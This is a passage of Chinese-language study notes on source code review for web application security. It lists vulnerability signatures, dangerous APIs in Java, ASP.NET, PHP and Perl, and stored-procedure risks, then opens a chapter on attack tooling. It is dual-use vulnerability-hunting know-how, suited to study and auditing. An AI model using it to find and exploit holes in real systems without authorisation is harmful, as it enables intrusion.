<p>最好的方式是二者相互补充，在阅读源码的过程中，如果发现了潜在漏洞，就使用黑盒进行自动化的测试，看漏洞是否能够触发；</p>
<h3 id="代码审查方法-1"><a href="#代码审查方法-1" class="headerlink" title="代码审查方法"></a>代码审查方法</h3><p>对于功能复杂的应用程序，源代码通常有成千上万行，从头到尾逐一阅读并不是最好的办法，可以使用结构化的技巧，来提高漏洞查找效率：</p>
<ul>
<li>从数据进入点开始追踪整个处理的流程，审查负责处理这些数据的代码（不同的 Web 开发语言，其处理框架不同、常见配置不同，可事先阅读文档进行了解）；</li>
<li>在代码中搜索隐含常见漏洞的代码关键字，审查包含关键字的代码，确定是否存在漏洞；</li>
<li>对包含敏感功能的代码进行审查，理解其逻辑，审查是否存在安全问题。这些敏感功能包括：身份验证功能、会话管理、访问控制、输入确认、外部组件接口、动态库调用；</li>
</ul>
<blockquote>
<p>应用程序很可能对第三方库和 API 进行定制化的封装或扩展，在审查之前，可预先了解封装的内容；</p>
</blockquote>
<h2 id="常见漏洞特征"><a href="#常见漏洞特征" class="headerlink" title="常见漏洞特征"></a>常见漏洞特征</h2><p>漏洞的关键特征并不区分语言，虽然各种语言的语法不同，但是相同的漏洞，仍然在不同的语言中，呈现相同的特征</p>
<h3 id="跨站点脚本"><a href="#跨站点脚本" class="headerlink" title="跨站点脚本"></a>跨站点脚本</h3><p>在典型的 XSS 漏洞中，代码会从用户的请求参数中，提取参数值，生成 HTML 页面内容；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210425090250.png"></p>
<p>以及从请求参数中提取内容，作为响应中的变量值：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426085159.png"></p>
<blockquote>
<p>此处的漏洞微妙，即仅当 requestType的值为 3 的时候，漏洞才有可能被触发，这种漏洞在黑盒测试中不容易发现，除非使用对每一个参数都进行单独的测试；</p>
</blockquote>
<h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>SQL 漏洞的典型特征是提取用户的输入，然后和各种硬编码的字符串组成 SQL 查询指令；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426085547.png"></p>
<p>只需要在代码中搜索 SQL 指令的关键字片断，就很容易很到这一类硬编码的字符串；</p>
<blockquote>
<p>注意：SQL 指令不区分大小写，因此搜索的时候，应该启用大小写不敏感的功能；</p>
</blockquote>
<h3 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h3><p>调用操作系统 API 的位置，最有可能出现路径遍历漏洞， 此时代码常常将用户输入值附加在某个目录名称后面，组成完整的路径；此类漏洞常常出现于允许用户上传和下载文件的功能中；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426090057.png"></p>
<h3 id="任意重定向"><a href="#任意重定向" class="headerlink" title="任意重定向"></a>任意重定向</h3><p>重定向漏洞的特征在于从用户提交的输入中提取内容用来组成 URL 值；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426090625.png"></p>
<p>除了服务端外，客户端的 JS 代码也可能存在重定向漏洞，因此客户端 JS 代码也会提取用户的输入生成 URL；由于 JS 代码是明文的，任意用户都可以查看，因此攻击者无须权限，就可以核查里面的内容，是否包含可利用的漏洞；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426091222.png"></p>
<blockquote>
<p>在对参数值进行检查确认之后，再次解码就会引入漏洞，因为攻击者可以先将攻击荷载进行双重编码，第一次解码后，可通过检查；等到第二次解码时，再让攻击荷载真正生效起来；例如设计成这样：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426091427.png"></p>
</blockquote>
<h3 id="OS-命令注入"><a href="#OS-命令注入" class="headerlink" title="OS 命令注入"></a>OS 命令注入</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427081806.png"></p>
<blockquote>
<p>通常各种语言都有内置调用操作系统命令的方法，搜索这些方法的关键字即可，例如此处的 system；</p>
</blockquote>
<h3 id="后门密码"><a href="#后门密码" class="headerlink" title="后门密码"></a>后门密码</h3><p>为了调试方便，一般开发者会将后门密码写在身份验证的函数中，非常容易确认；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427082026.png"></p>
<h3 id="可执行文件漏洞"><a href="#可执行文件漏洞" class="headerlink" title="可执行文件漏洞"></a>可执行文件漏洞</h3><p>应对可执行文件的源代码进行审查，确保里面没有包含一些常见的漏洞，例如：</p>
<h4 id="缓冲区溢出漏洞-1"><a href="#缓冲区溢出漏洞-1" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h4><p>当创建某个内存缓冲区后，接下来会调用 API 往缓冲区中写入数据，漏洞发生在写入的环节。有多个内置函数可以实现对缓冲区的写入，重点应该注意这些写入的内容，是否由用户控制，以及写入之前，是否对长度进行检查。通过在源代码中搜索每一个调用缓冲写入函数的位置，即可以排查漏洞；</p>
<blockquote>
<p>常见的缓冲区写入函数有：strcpy、memcpy、sprintf 及它们的各种变体；</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427084503.png"></p>
<h4 id="整数漏洞-1"><a href="#整数漏洞-1" class="headerlink" title="整数漏洞"></a>整数漏洞</h4><p>整数漏洞总体来说比较隐蔽，不仔细思考一眼不一定看得出来。但有些情况比较明显，例如有符号整数和无符号整数的比较时（原因：隐式转换）；例如 len 和 sizeof 的比较；</p>
<h4 id="格式化字符串漏洞-1"><a href="#格式化字符串漏洞-1" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h4><p>通过搜索 printf 和 FormatMessage 系列函数的位置，如果参数由用户控制，则很可能存在漏洞；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427085119.png"></p>
<h3 id="源代码注释"><a href="#源代码注释" class="headerlink" title="源代码注释"></a>源代码注释</h3><p>当开发者觉得某段代码存在隐患，为避免遗忘，一般会在注释中写下说明，以便后续能够快速想起。但由于各种不可控的原因，这些隐患经常没有在第一时间得到排除，导致它们一直存在。通过在注释中搜索一些常见的关键字，可用来发现这类问题，常见关键字有：bug, problem, bad, hope, todo, fix, overflow, crash, inject, xss, trust, error 等；</p>
<h2 id="Java-平台"><a href="#Java-平台" class="headerlink" title="Java 平台"></a>Java 平台</h2><h3 id="获取用户提交的数据"><a href="#获取用户提交的数据" class="headerlink" title="获取用户提交的数据"></a>获取用户提交的数据</h3><p>Java Web 程序一般通过 javax.servlet.ServletRequest 以及它的扩展 javax.servlet.http.HttpServletRequest 两个接口来获取用户提交的请求数据，这两个对象包含大量的方法，可用来提取请求对象中的内容；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427085806.png"></p>
<h3 id="会话交互"><a href="#会话交互" class="headerlink" title="会话交互"></a>会话交互</h3><p>Java Web 程序一般通过 javax.servlet.http.HttpSession 接口来管理用户的会话，该接口常用方法如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427085951.png"></p>
<h3 id="潜在的危险-API"><a href="#潜在的危险-API" class="headerlink" title="潜在的危险 API"></a>潜在的危险 API</h3><h4 id="文件访问"><a href="#文件访问" class="headerlink" title="文件访问"></a>文件访问</h4><p>Java 一般使用 java.io.File 类来访问文件或目录，它的构造函数接收路径或者目录+文件名做为参数进行实例化，如果在构造函数中没有检查点和斜线，并且参数由用户控制，则可能存在路径遍历漏洞；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427090537.png"></p>
<p>关于文件内容的读写，Java 常用类如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427090659.png"></p>
<p>它们同样存在和 java.io.File 相同的问题</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427090748.png"></p>
<h4 id="数据库访问"><a href="#数据库访问" class="headerlink" title="数据库访问"></a>数据库访问</h4><p>以下几个用于查询数据库的 API 容易受到 SQL 注入攻击，因为它们的查询参数直接由拼接字符串的方式实现；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073357.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073409.png"></p>
<p>另外一种更加安全的做法，是避免拼接字符串，而是以替换指定位置的字符串来实现（通过 prepareStatement），包括如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073528.png"></p>
<h4 id="OS-命令执行"><a href="#OS-命令执行" class="headerlink" title="OS 命令执行"></a>OS 命令执行</h4><p>Java 调用系统命令的 API 如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073905.png"></p>
<p>如果传递给这些 API 的参数能够被用户控制，则存在命令注入漏洞。但如果用户只能控制部分字符串，例如只能指定命令参数，而不能指定命令名称，那么出现漏洞的概率就比较小；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074051.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074033.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074218.png"></p>
<h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><p>Java 发送重定向响应的相关 API 如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074436.png"></p>
<p>  攻击者除了通过 sendRedirect 来实现重定向外，还可以使用 setStatus 为 3XX，同时通过 addHeader 添加 Location 字段，来实现重定向；</p>
<h4 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h4><p>Java 使用 java.net.Socket 类来创建 socket 连接，如果用户能够控制传递给  socket 类的参数，则可能存在漏洞，因为攻击者可以利用该 socket 连接，访问其他主机；</p>
<h3 id="配置-Java-环境"><a href="#配置-Java-环境" class="headerlink" title="配置 Java 环境"></a>配置 Java 环境</h3><p>Java web 环境配置参数一般放在 web.xml 文件中，内容一般包括登录验证方式，资源访问控制等；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428075230.png"></p>
<p>除了 web.xml 文件外，还有部分相关配置参数放在应用程序服务器的配置文件中，例如 weblogic.xml 文件等，应同时检查这些配置文件，查看是否存在漏洞；</p>
<h2 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="ASP.NET"></a>ASP.NET</h2><h3 id="获取用户提交的数据-1"><a href="#获取用户提交的数据-1" class="headerlink" title="获取用户提交的数据"></a>获取用户提交的数据</h3><p>System.Web.HttpRequest  类</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081146.png"></p>
<h3 id="会话交互-1"><a href="#会话交互-1" class="headerlink" title="会话交互"></a>会话交互</h3><p>Session 类：保留跟当前会话相关的用户信息；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081352.png"></p>
<p>Profile 类：用于保存用户的个性化设置，因此它是持久性的，跟当前会话无关；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081535.png"></p>
<p>System.Web.SessionState.HttpSessionState 类：也可以用来保存会话信息，相关的方法如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081653.png"></p>
<h3 id="潜在的危险-API-1"><a href="#潜在的危险-API-1" class="headerlink" title="潜在的危险 API"></a>潜在的危险 API</h3><h4 id="文件访问-1"><a href="#文件访问-1" class="headerlink" title="文件访问"></a>文件访问</h4><p>System.IO.File 类：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081829.png"></p>
<p>读取和写入的类：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081851.png"></p>
<h4 id="数据库访问-1"><a href="#数据库访问-1" class="headerlink" title="数据库访问"></a>数据库访问</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081914.png"></p>
<p>同 Java 一样，如果直接拼接查询字符串会存在漏洞隐患，更安全的做法是通过 Parameters 属性来创建使用参数占位符的查询语句；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428082229.png"></p>
<h4 id="动态代码"><a href="#动态代码" class="headerlink" title="动态代码"></a>动态代码</h4><p>ASP 通过 VBScript 可以接受动态代码，相关几个函数包括：</p>
<ul>
<li>Eval 函数：接受 VBScript 代码字符串； </li>
<li>Execute 函数：接受 ASP 代码字符串；</li>
<li>ExecuteGlobal 函数：接受 ASP 代码字符串；</li>
</ul>
<h4 id="OS-命令执行-1"><a href="#OS-命令执行-1" class="headerlink" title="OS 命令执行"></a>OS 命令执行</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428082826.png"></p>
<p>如果可以直接向 Start 传递字符串参数，或者通过 StartInfo 传递参数，则存在漏洞隐患。</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428083130.png"></p>
<p>即使仅能控制部分字符串，也有隐患：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428083157.png"></p>
<p>另外通过 ProcessStartInfo 的 Arguments 属性，如果用户可以控制 Arguments 的参数，则虽然攻击者不能执行指定代码，但可以通过指定参数，影响命令的期望行为，例如下载恶意文件到主机的任意位置；</p>
<h4 id="重定向-1"><a href="#重定向-1" class="headerlink" title="重定向"></a>重定向</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428083436.png"></p>
<h4 id="套接字-1"><a href="#套接字-1" class="headerlink" title="套接字"></a>套接字</h4><p>System.Net.Sockets.Socket 类，漏洞利用方法跟 Java 平台一样；</p>
<h3 id="ASP-NET-环境配置"><a href="#ASP-NET-环境配置" class="headerlink" title="ASP.NET 环境配置"></a>ASP.NET 环境配置</h3><p>环境配置参数放在 Web 根目录下的 web.config 文件中</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428084414.png"></p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="获取用户提交的数据-2"><a href="#获取用户提交的数据-2" class="headerlink" title="获取用户提交的数据"></a>获取用户提交的数据</h3><p>PHP 使用一些内置变量来保存用户的请求数据</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428085113.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428085129.png"></p>
<p>在处理用户的输入时，PHP 有一些特殊的用法：</p>
<ul>
<li>$GLOBALS 对象用来访问预先定义的全局变量；</li>
<li>如果配置项 register_globals 开启，则 PHP 会为每个请求参数建立全局变量，访问程序中的代码在各处实现访问请求参数，而无须传递这些请求参数；这会给代码审查增加一些额外的工作，因为对请求参数的引用，变得更加隐蔽了；</li>
<li>$_SERVER 数据中可以访问用户提交的定制消息头；</li>
<li>如果请求参数中的某个参数名称包含索引引用，则该参数的值将被自动转换成对象类型；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428090257.png"></li>
</ul>
<h3 id="会话交互-2"><a href="#会话交互-2" class="headerlink" title="会话交互"></a>会话交互</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428090402.png"></p>
<h3 id="潜在的危险-API-2"><a href="#潜在的危险-API-2" class="headerlink" title="潜在的危险 API"></a>潜在的危险 API</h3><h4 id="文件访问-2"><a href="#文件访问-2" class="headerlink" title="文件访问"></a>文件访问</h4><p>PHP 中读写文件的函数有很多个，其中一些还可以访问远程文件；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073634.png"> <img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073652.png">   <img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073720.png"> </p>
<p>如果直接向上面这些函数传递拼接后的字符串，则将存在漏洞隐患；</p>
<p>另外还有一些函数用于执行 PHP 脚本，如果用户可以控制传递给它们的参数，则也非常危险；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073846.png"></p>
<p>访问远程文件的功能默认是打开的，可通过配置参数 allow_url_fopen  将其关闭；但是关闭后，仍然有几个方法可用于访问远程文件，PHP 在 5.2 以上版本引入了 allow_url_include 参数并默认将其关闭来避免上述漏洞；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074224.png"></p>
<h4 id="数据库访问-2"><a href="#数据库访问-2" class="headerlink" title="数据库访问"></a>数据库访问</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074253.png"></p>
<p>以上函数直接接受字符串查询参数，易于受到攻击。下面几个函数则使用占位符的方式插入查询参数，相对安全；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074352.png"></p>
<h4 id="动态代码-1"><a href="#动态代码-1" class="headerlink" title="动态代码"></a>动态代码</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074800.png"></p>
<p>动态代码的多个语句使用分号进行分隔，如果用户可控制参数，则易于受到脚本注入攻击；</p>
<p>另外搜索替换功能的正则表达式函数 preg_replace，如果以 /e 选项调用，则会执行 PHP 代码；若用户可控制参数，则存在漏洞隐患；</p>
<p>PHP 还接受函数名称做为变量，然后动态调用该函数；因此攻击者可以通过指定相应的参数名称，让 PHP 调用某些内置的敏感函数，如 phpinfo，获取与 PHP 运行时环境相关的信息；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429075147.png"></p>
<h4 id="OS-命令执行-2"><a href="#OS-命令执行-2" class="headerlink" title="OS 命令执行"></a>OS 命令执行</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429082649.png"></p>
<p>跟 JAVA, ASP 不同，PHP 的系统命令接口，接受 | 字符用来对多个命令进行连接，因此它非常危险；如果未对用户的输入进行过滤，意味着攻击者有机会执行任意的系统命令；</p>
<h4 id="重定向-2"><a href="#重定向-2" class="headerlink" title="重定向"></a>重定向</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429082838.png"></p>
<p>实现重定向有两种方法，一种直接使用  http_redirect API，另外一种是通过 setResponseCode 和 setHeaders；</p>
<h4 id="套接字-2"><a href="#套接字-2" class="headerlink" title="套接字"></a>套接字</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429083021.png"></p>
<p>通过 socket_create 函数可与任意的主机建立连接，无论是公共的因特网，还是私有网络上的任意主机；fsockopen 和 pfsockopen 函数在建立连接后，可返回一个标准文件指针，供 fwrite 和 fgets 等函数调用，从而实现两个主机之间的数据传输；</p>
<h3 id="配置-PHP-环境"><a href="#配置-PHP-环境" class="headerlink" title="配置 PHP 环境"></a>配置 PHP 环境</h3><p>PHP 配置参数放在 php.ini 文件中，它的内容结构和 windows ini 文件类似，里面有很多不安全的选项（新版本的 PHP 删除掉了很多问题选项）；</p>
<h4 id="使用全局变量"><a href="#使用全局变量" class="headerlink" title="使用全局变量"></a>使用全局变量</h4><p>如果 redister_globals 选项被开启，则 PHP 会为每个请求参数建立全局变量；如果变量在使用前没有预先初始化一个值，那么攻击者就可以将某个变量设置为任意值，从而存在应用程序的逻辑；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429083712.png"></p>
<blockquote>
<p>PHP 4.2 以上版本将 register_globals 设置为默认关闭了，并在 PHP 6  以下版本完全去除了该选项；</p>
</blockquote>
<h4 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h4><p>如果开启 safe_mode 模式，则某些危险的函数将被禁用，某些敏感函数的功能会受到一定的使用限制；例如：</p>
<ul>
<li>shell_exec 函数被禁用，原因：该函数可用于调用任意的操作系统命令；</li>
<li>mail 函数的 additional_parameters 参数被禁用，原因：该参数存在 SMTP 注入漏洞；</li>
<li>exec 函数仅限于执行 safe_mode_exec_dir 中指定的可执行程序，并且将转义命令行中的元字符；</li>
</ul>
<blockquote>
<p>虽然 safe_mode 限制了部分危险函数，但是由于它不可能限制所有的函数，因此攻击者仍然有机会通过其他函数曲线救国，实施攻击。因此在 PHP 6 以上的版本，安全模式已经被删除了；</p>
</blockquote>
<h4 id="magic-quotes"><a href="#magic-quotes" class="headerlink" title="magic quotes"></a>magic quotes</h4><p>当 magic quotes 选项被激活时，PHP 将转义请求参数中的任何单引号、双引号、反斜线和空格（即为它们添加一个反斜线）。该选项的目的是防范 SQL  注入攻击；</p>
<p>但事实上，这个功能的效果很有限，因为攻击者可以使用二阶攻击的方式来避开转义，另外在 SQL 中注入数字字段时，也不需要单引号。</p>
<p>更搞笑的是，某些数据的处理并不能添加转义，因此如果开启了 magic quotes 选项，则开发者还需要在源代码中，删除 PHP 添加的转义符，从而对请求参数做出一些原本并不需要的修改，导致出现混乱；</p>
<p>通常建议关闭该选项，因为它是针对所有请求参数的，太没有针对性了，很容易引入更多的麻烦。更好的做法是使用预处理语句，来安全的访问数据库；</p>
<blockquote>
<p>PHP 6 以上版本已经删除了该选项；</p>
</blockquote>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429084953.png"></p>
<h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><p>Perl 是一种非常灵活的语言，同一个任务，有很多种写法，这也意味着漏洞的敞口很大，尤其是在自主开发的模块中，部分没有经验的开发者有可能在其中引入一些危险的函数来执行任务。Perl Web 程序通常使用 CGI.pm 模块来构造（后面的内容围绕该模块展开，如果不是使用该模块，则相关功能的 API 需要另外查文档确定；</p>
<h3 id="获取用户提交的数据-3"><a href="#获取用户提交的数据-3" class="headerlink" title="获取用户提交的数据"></a>获取用户提交的数据</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430072702.png"></p>
<h3 id="会话交互-3"><a href="#会话交互-3" class="headerlink" title="会话交互"></a>会话交互</h3><p>Perl 使用 CGISession.pm 模块来实现会话管理，写法如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430073115.png"></p>
<h3 id="潜在的危险-API-3"><a href="#潜在的危险-API-3" class="headerlink" title="潜在的危险 API"></a>潜在的危险 API</h3><h4 id="文件访问-3"><a href="#文件访问-3" class="headerlink" title="文件访问"></a>文件访问</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430073257.png"></p>
<p>open 接受文件名参数，实现向指定文件写入或读取内容，因此如果用户可以控制文件名参数，则攻击者可以利用它来访问任意文件；更狠的是， open 还允许在参数中使用管道连接符 “|”，如果参数中包含管道符，则参数内容将被发送给 shell，因此攻击者可以利用它来执行任意的操作系统命令；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430073626.png"></p>
<h4 id="数据库查询"><a href="#数据库查询" class="headerlink" title="数据库查询"></a>数据库查询</h4><ul>
<li>selectall_arrayref</li>
<li>do</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430075150.png"></p>
<p>较安全的做法是使用包含占位符的语句，通过下面两个函数来实现：</p>
<ul>
<li>prepare</li>
<li>execute</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430075304.png"></p>
<h4 id="动态代码-2"><a href="#动态代码-2" class="headerlink" title="动态代码"></a>动态代码</h4><p>Perl 也使用 eval 函数来执行动态代码，同时使用分号作为分隔符，连接多个语句；</p>
<h4 id="OS-命令执行-3"><a href="#OS-命令执行-3" class="headerlink" title="OS 命令执行"></a>OS 命令执行</h4><ul>
<li>system</li>
<li>exec</li>
<li>qx</li>
<li>反单引号 `</li>
</ul>
<p>以上函数都接受管道符，因此攻击者可以利用以上函数，执行任意的操作系统命令；</p>
<h4 id="重定向-3"><a href="#重定向-3" class="headerlink" title="重定向"></a>重定向</h4><ul>
<li>redirect：其参数可以是相对 URL，也可以是绝对 URL 的字符串；</li>
</ul>
<h4 id="套接字-3"><a href="#套接字-3" class="headerlink" title="套接字"></a>套接字</h4><ul>
<li>socket：创建套接字</li>
<li>connect：建立连接</li>
</ul>
<h3 id="配置-Perl-环境"><a href="#配置-Perl-环境" class="headerlink" title="配置 Perl 环境"></a>配置 Perl 环境</h3><p>相对于 PHP 使用安全模式，Perl 比较有意思，它使用污染模式，即默认用户的输入都是被污染和不安全的，如果有任意变量是基于用户的输入来赋值，那么该变量也会视为被污染的变量；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430075936.png"></p>
<p>污染的变量无法作为一些标记为敏感函数的参数，如 eval、system、exec、open 等，需要使用正则表达式对污染变量进行净化后，才可以使用，示例如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430080059.png"></p>
<blockquote>
<p>Perl 的污染模式相当于要求开发者强制对输入进行过滤，从某种程度来说，确实提高了开发者的安全意识；</p>
</blockquote>
<p>虽然污染模式的初衷是很好的，但是它的安全防御效果，还取决于开发者能否写出正确有效的正则表达式，如果不行的话，仍然是存在漏洞隐患的；</p>
<h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><p>前端的 JS 代码无须任何权限，即可被用户查看。查看这部分代码有助于了解前端实施了哪些输入检查机制，以及动态生成的页面结构；有两个位置存在 JS 代码，一个是 js 文件，另外一个是嵌入在 HTML 中的 JS 代码；</p>
<p>主要的检查点为 DOM 操作以及对当前文档进行修改的 API；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430080645.png"></p>
<h2 id="数据库组件"><a href="#数据库组件" class="headerlink" title="数据库组件"></a>数据库组件</h2><p>由于数据库软件变得越来越强大，因此它的功能已经不再局限于存储数据，而是围绕存储目标，进行了强大的扩展和增强，因此也经常被用于执行一定程度的业务逻辑。这些扩展的功能包括：存储过程、触发器、自定义函数等；因此，在审查源代码时，也有必要同时审查写在数据库组件中的代码；</p>
<p>数据库组件的安全隐患，从本质上来说，跟其他语言并没有区别，只是语法稍有不同而已，常见的漏洞仍然为下面两类：</p>
<ul>
<li>存在 SQL 注入漏洞；</li>
<li>使用用户参数，调用敏感函数</li>
</ul>
<h3 id="SQL-注入-1"><a href="#SQL-注入-1" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>除了在业务源代码层面排除注入隐患外，还需要检查存储过程，因为有些隐患发生在这些地方，示例如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430081547.png"></p>
<p>不同的数据库软件，其动态执行 SQL 语句的命令不同，常见数据库及其命令名称如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430081643.png"></p>
<h3 id="调用危险的函数"><a href="#调用危险的函数" class="headerlink" title="调用危险的函数"></a>调用危险的函数</h3><p>数据库本质上是一个软件，运行的时候，它自己即是一个进程，因此它具有所有进程都会拥有的功能，可以在权限范围内执行任意的系统命令。为了增强数据库本身的功能，它开放了一部分接口供开发者在存储过程中调用，这在带来方便的同时，也引入了安全隐患；攻击者可以利用它来执行任意的操作系统命令；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430083707.png"></p>
<h2 id="代码浏览工具"><a href="#代码浏览工具" class="headerlink" title="代码浏览工具"></a>代码浏览工具</h2><p>为了完成源代码的审查，不可避免需要实现大量搜索、跳转等动作，因此，使用一个支持多种语言的源码浏览软件，会提高很多效率，常见的有 Visual Studio、NetBeans 和 Eclipse 等。作者在此处推荐了一个以前没听说的，叫 Source Insight，估计是专门针对这个场景进行开发和优化的；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430084420.png"></p>
<h1 id="20-Web-应用程序工具包"><a href="#20-Web-应用程序工具包" class="headerlink" title="20. Web 应用程序工具包"></a>20. Web 应用程序工具包</h1><p>理论上只需要一个浏览器就可以发起 Web 攻击，不过这样做显示效率不高，因为浏览器毕竟是作为普通用户浏览 Web 网站的场景而开发的，因此更高效的做法是开发额外的工具，将它放在浏览器和目标应用程序之间，拦截浏览器和应用程序之间的请求和响应，根据需要修改请求和读取响应，实现预期的目标。</p>
<p>第二类工具是基于常见的漏洞特征，自动对目标应用程序进行扫描，寻找是否存在潜在的漏洞。第三类工具是针对某种特定的漏洞执行特定的任务，这类工具使用的频率比较低，但由于它是针对性开发，因此在针对特定问题上，其效果非常好。</p>
<h2 id="Web-浏览器"><a href="#Web-浏览器" class="headerlink" title="Web 浏览器"></a>Web 浏览器</h2><p>不的浏览器厂家，其开发的浏览器功能和配置有所不同，因此在使用它们进行攻击时，需要了解并利用它们不同的特性，来提高攻击的效率；</p>
<h3 id="Internet-Explorer"><a href="#Internet-Explorer" class="headerlink" title="Internet Explorer"></a>Internet Explorer</h3><p>虽然 IE 浏览器已经非常古老了，但令人遗憾的是，目前它仍然在世界上占据一定的市场份额，它只能运行在 Windows 平台上，而且也只有它支持 ActiveX 控件。</p>
<blockquote>
<p>截止 2021-5-1，网上查到的各浏览器市场份额如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501081455.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501081508.png"></p>
</blockquote>
<blockquote>
<p>IE 8 引入了反 XSS 功能，并且默认开启，因此在探查 XSS 漏洞时，需要先将其关闭。待找到漏洞后，再将其打开，如果需要，可进一步规避该漏洞的办法；</p>
</blockquote>
<p>以下两个 IE 扩展可协助攻击 Web 应用程序：</p>
<ul>
<li>HttpWatch：用于分析所有的 HTTP 请求和响应；</li>
